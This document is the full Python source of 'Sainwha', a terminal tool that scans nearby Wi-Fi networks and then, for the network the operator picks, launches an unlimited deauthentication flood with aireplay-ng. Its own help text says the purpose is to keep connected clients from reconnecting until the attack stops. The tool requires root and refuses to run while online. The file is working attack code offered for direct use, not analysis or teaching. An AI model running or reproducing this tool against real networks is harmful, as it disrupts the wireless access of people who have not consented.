# sainwha by yzee4
#
# MIT License
#
# Copyright (c) 2023 yzee4
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# Code version SEX26JAN012024

# Importa as libs necessarias
import os
import csv
import sys
import time
import shutil
import socket
import readline
import threading
import subprocess

# Definicao de cores
def colors():
    # Nomes das cores de acordo com a formatacao do terminal Linux
    # Se estiver em outro tema, como Kali-Dark ou variantes, as cores podem mudar e nao corresponderem ao nome
    global white, red, green, black, silver
    white = '\033[0;97m'
    red = '\033[0;91m'
    green = '\033[0;92m'
    black = '\033[0;90m'
    silver = '\033[0;89m'
colors()

# Verifica se usuario esta em modo root
def verify_root():
    if os.geteuid() == 0:
        return True
    else:
        print(f"{red} > {white}Execute as root!")
        sys.exit()
verify_root()

# Verifica se as ferramentas necessarias estao instaladas
def check_tool_installed(tool_name):
    if tool_name == 'net-tools':
        return os.path.exists('/sbin/ifconfig')
    else:
        return shutil.which(tool_name) is not None

def initializing_sainwha():
    subprocess.call('clear')
    tools_to_check = ['aircrack-ng', 'net-tools']
    not_installed_tools = []
    for tool in tools_to_check:
        if not check_tool_installed(tool):
            not_installed_tools.append(tool)
    if not_installed_tools:
        for tool in not_installed_tools:
            print(f"{red} > {black}{tool} {white}not installed. To install, use '{green}sudo apt install {tool}{white}'.")
            sys.exit()
initializing_sainwha()

# Verifica se o usuario esta conectado a internet
def check_network_connection():
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except OSError:
        pass
    return False
if check_network_connection():
    subprocess.run("clear")
    print(f"{red} > {white}Please start sainwha without {black}being connected to a internet{white}.")
    sys.exit()
else:
    exit_script = False

# Verifica se o usuario se conectou a internet
def check_internet():
    while not exit_script:
        try:
            subprocess.run(["ping", "-c", "1", "google.com"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except subprocess.CalledProcessError:
            pass 
        else:
            subprocess.run("clear")
            print(f"{red} > {white}{black}Do not activate the internet {white}while using sainwha.") 
            os._exit(0)
        time.sleep(0.1) 
internet_thread = threading.Thread(target=check_internet)
internet_thread.start()

# Variaveis de funcionamento
def global_variables():
    # Variaveis de exibicao e informacao
    # INTERFACE: Network Adapter
    # network: Network Name
    # CHANNEL: Network Channel
    # BSSID: Network MAC
    global interface, network, channel, bssid

    # Variaveis de definicao 
    global set_network, set_interface

    # Arquivo temporario
    global tempfolder

    # Retorna tudo a None e false
    interface = None
    network = None
    channel = None
    bssid = None

    set_interface = 'false'
    set_network = 'false'
global_variables()

# Remove o arquivo temporario
def temp_folder():
    global tempfolder
    current_directory = os.getcwd()
    tempfolder = current_directory
    os.chdir(tempfolder)
    for archive in os.listdir(tempfolder):
        if archive == "sainwha-01.csv":
            archive_path = os.path.join(tempfolder, archive)
            os.remove(archive_path)
temp_folder()

# Definir o interface
# Exibe uma lista de interface para o usuario escolher                
def cmd_set_interface():
    global interface
    global set_interface

    # Escaneia os interfaces disponiveis
    def network_cards():
        try:
            result = subprocess.check_output(["iw", "dev"])
            result_str = result.decode("utf-8")
            cards = []
            lines = result_str.split("\n")
            for line in lines:
                if "Interface" in line:
                    card_name = line.replace("Interface", "").strip()
                    cards.append(card_name)
            return cards
        except subprocess.CalledProcessError:
            print(f"{red} > {white}'iw dev' not executed")
            print('')
    network_cards()

    # Exibe as informacoes na tela
    # O usuario ira escolher o interface
    def scan_interface():
        global scan_interface_process
        global cards
        cards = network_cards()
        if not cards:
            print(f"{red} > {white}No network adapters available\n")
            return None
        for card in cards:
            print(f"{green} > {white}Availables interfaces:")
            print(f"{green} . {white}{card}\n")
            scan_interface_process = 'true'
    scan_interface()
    try:
        while True:
            try:
                interfacei = input(f"{black} > {white}Set interface > ")
            except KeyboardInterrupt:
                print(f"\n {red}> {white}Interface has not set\n")
                main()
            if interfacei in cards:
                interface = interfacei
                set_interface = 'true'
                print(f"{green} > {white}interface set to '{green}{interface}{white}'\n")
                main()
                break
            else:
                print(f"{red} > '{black}{interfacei}{white}' Does not match a valid interface\n")
    except KeyboardInterrupt:
        print('\n')
        main()

# Definir o network
# Exibe uma lista de network (redes) para o usuario escolher        
def cmd_set_network_part1():
    if set_interface == 'true':
        try:
            # Define o tempo que o escaneamento de rede sera feito
            def set_scanning_time():
                global scanning_time
                try:
                    while True:
                        try:
                            iscanning_time = input(f"{black} > {white}Set scanning time (in seconds) > ")
                        except KeyboardInterrupt:
                            print(f"\n {red}> {white}Network has not set\n")
                            main()
                        if iscanning_time.isdigit():
                            scanning_time = float(iscanning_time)
                            break
                        else:
                            print(f"{red} > {white}Enter a number!\n")
                except KeyboardInterrupt:
                    print('\n\n')
                    main()
            set_scanning_time()

            # Escaneia as redes proximas e exibe as informacoes
            def cmd_set_network_part2():
                global network
                global bssid
                global channel
                global scanning_time
                global set_network

                # Informacoes gravadas no arquivo temporario
                process = subprocess.Popen(f"airodump-ng -w {tempfolder}/sainwha --write-interval 1 --output-format csv {interface}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                print(f"{green} > {white}Scanning... please wait for '{green}{scanning_time}{white}' seconds")
                time.sleep(scanning_time)
                process.terminate()
                process.wait()
                network_data = []
                networks = []

                # Le as informacoes do arquivo temporario e grava nas variaveis correspondentes
                try:
                    with open(f"{tempfolder}/sainwha-01.csv") as arquivo_csv:
                        writer_csv = csv.reader(arquivo_csv)
                        for line in writer_csv:
                            if len(line) >= 15 and line[0].strip() != 'BSSID':
                                view_bssid = line[0].strip()
                                view_network = line[13].strip()
                                view_channel = line[3].strip()
                                if view_network:
                                    network_data.append((view_bssid, view_network, view_channel))
                                    networks.append(view_network)
                                    temp_folder()
                except FileNotFoundError:
                    print(f"{red} > {white}File not found\n")
                    main()

                # Exibe as informacoes na tela    
                if network_data:
                    print(f"\n{green} > {white}Available networks:")
                    for view_bssid, view_network, view_channel in network_data:
                        print(f"{green} . {white}{view_network}")
                    print('')
                else:
                    print(f"{red} > {white}Networks not found\n")
                    main()

                # Definir o network
                while True:
                    try:
                        try:
                            inetwork = input(f"{black} > {white}Set network > ")
                        except KeyboardInterrupt:
                            print(f"\n {red}> {white}Network has not set\n")
                            main()
                        if inetwork in networks:
                            for chosen_bssid, chosen_network, chosen_channel in network_data:
                                if chosen_network == inetwork:
                                    network = chosen_network
                                    channel = chosen_channel
                                    bssid = chosen_bssid
                                    print(f"{green} > {white}NETWORK set to '{green}{network}{white}'")
                                    print(f"{green} > {white}CHANNEL set to '{green}{channel}{white}'")
                                    print(f"{green} > {white}MAC set to '{green}{bssid}{white}'\n")
                                    set_network = 'true'
                            break
                        else:
                            print(f"{red} > '{black}{inetwork}{white}' Does not match a valid network\n")
                    except KeyboardInterrupt:
                        print('\n')
                        main()
            cmd_set_network_part2()
        except KeyboardInterrupt:
            print('\n\n')
            main()
    else:
        print(f"{red} > {white}Interface has not set. Use '{green}set interface{white}'\n")

# Iniciar o ataque
# Processo de envio de pacotes de desautentificacao
def cmd_start():
    if set_network == 'true':
        global interface
        global network
        global channel
        global bssid
        try:            
            # Define a rota ate a rede
            print(f"\n{green} > {white}Starting attack on '{green}{network}{white}' channel '{green}{channel}{white}'...")
            airodump_process = subprocess.Popen(f"airodump-ng --bssid {bssid} --channel {channel} {interface} > /dev/null 2>&1", shell=True)
            time.sleep(0.5)
            os.kill(airodump_process.pid, 2)

            # Inicia o envio de pacotes
            print(f"{black} > {white}Attack started. Press '{green}Ctrl+C{white}' to stop")
            subprocess.run(f"aireplay-ng --deauth 0 -a {bssid} {interface} > /dev/null 2>&1", shell=True)
            print(f"{red} > {white}Unknown error{white}")
            os._exit(1)

        except KeyboardInterrupt:
            print(f"{green} > {white}Attack interrupted!\n")
            main()
    else:
        print(f"{red} > {white}Network has not set. Use '{green}set network{white}'\n")
cmd_start()

# Exibe as opcoes
# Aqui exibe as informacoes que precisam ser definidas e as que ja estao definidas
def cmd_options():
    print(f"""{black} > {white}Sainwha options:

INTERFACE: {green}{interface}{white}

NETWORK: {green}{network}{white}\tCHANNEL: {green}{channel}{white}\tMAC: {green}{bssid}{white}

{black} > {white}To set INTERFACE, use '{green}set interface{white}', to set NETWORK, use '{green}set network{white}'
""")

def cmd_help():
    print(f"""{black} > {white}Sainwha help menu:
          
{black} > {white}Commands:
    {black}set{white}    {green}interface{white}    or{white}    {green}int{white}    set a interface to scans
    {black}set{white}    {green}network{white}      or{white}    {green}net{white}    set a network that will be scans
    {green}start{white}                            {white}start sending deauth packets

    {black}> {white}Other:
       {green}options{white}    or{white}    {green}opt{white}          show all options to set
       {green}help{white}       or{white}    {green}h{white}            show this help menu
       {green}clear{white}      or{white}    {green}cls{white}          clear terminal

 {green}How it works is simple, the program sends deauthentication{white}
 {green}packets to the network. Connected clients are deauthenticated and{white} 
 {green}cannot be reconnected unless the attack is stopped{white}
      
""")

# Interface sainwha
# Baleiona santista SAAAAAANTOOOOOOOSSSS    
def interface_variables():
    global interfacemenu

    interfacemenu = (f"""{white}Sainwha - {green}Deauther{white} Attacker
{black}-|{white} GitHub {green}https://github.com/yzee4/Sainwha{white}
                                                 
{black}           █████               ███               
 {black}      █████████████           █████            
 {black}S    ██████{silver}██████{black}█████        ███████          
     █████████{silver}███████{black}██        ██████████       
 {black}A    ███████{silver}█████{black}███████        ██████████     
    █  ████████████████████     █████████       
 {black}I  ███  ██████  ████████████████████           
 {black}   █████      ████████████████████             
 {black}N   ██████████████████████████████             
      █{white}███████{black}████████████████████              
 {white}W{black}      {white}████████{black}█  {black}█████    {white}████{black}█               
 {black}         {white}███████{black}  ██████ {white}█████{black}                 
 {white}H{black}       █   {white}████{black}  ██████  {white}█{black}                    
 {black}       █████      {black}██████                       
 {white}A{black}                  █████                       
                    ████                        
 {white}coded by yzee4{black}     ███      {green}>{white} Linux theme{black}

 {green}>{white} When running Sainwha your network card may {black}disable{white} the internet connection
   If this happens, simply {green}restart your machine{white}

{white}To see options, use '{green}options{white}'
""")
interface_variables()

# Exibe a interface
def show_interface():
    subprocess.call('clear')
    print(f'''{interfacemenu}{white}''') 
show_interface()

# Menu de definicoes
def main():
    try:
        while True:
            userselect = input(f"{white}Sainwha{white} > ").strip()

            # Definir o interface
            # Inicia o processo de definicao do interface (Network Adapter)
            if userselect == "set interface" or userselect == "set int" or userselect == "interface" or userselect == "int":
                cmd_set_interface()

            # Definir o network
            # Inicia o processo de definicao do interface (Network Name)
            elif userselect == "set network" or userselect == "set net" or userselect == "network" or userselect == "net":
                cmd_set_network_part1()

            # Inica o ataque
            # Inicia o processo de envio de pacotes de desautenticacao            
            elif userselect == "start":
                cmd_start()

            # Exibe o menu de opcoes
            elif userselect == "options" or userselect == "opt":
                cmd_options()

            # Exibe o menu de ajuda
            elif userselect == "help" or userselect == "h":
                cmd_help()

            # Limpa o console
            elif userselect == "clear" or userselect == "cls":
                subprocess.run("clear")
                show_interface()
                main()

            # Caso o comando usado nao seja reconhecido, exibe o erro
            else:
                print(f"{red} > {white}Unknown command: {userselect}\n")

    # Sair do programa
    except KeyboardInterrupt:
        print(f"\n{white}Copyright (c) 2023 yzee4")
        os._exit(0)
main()


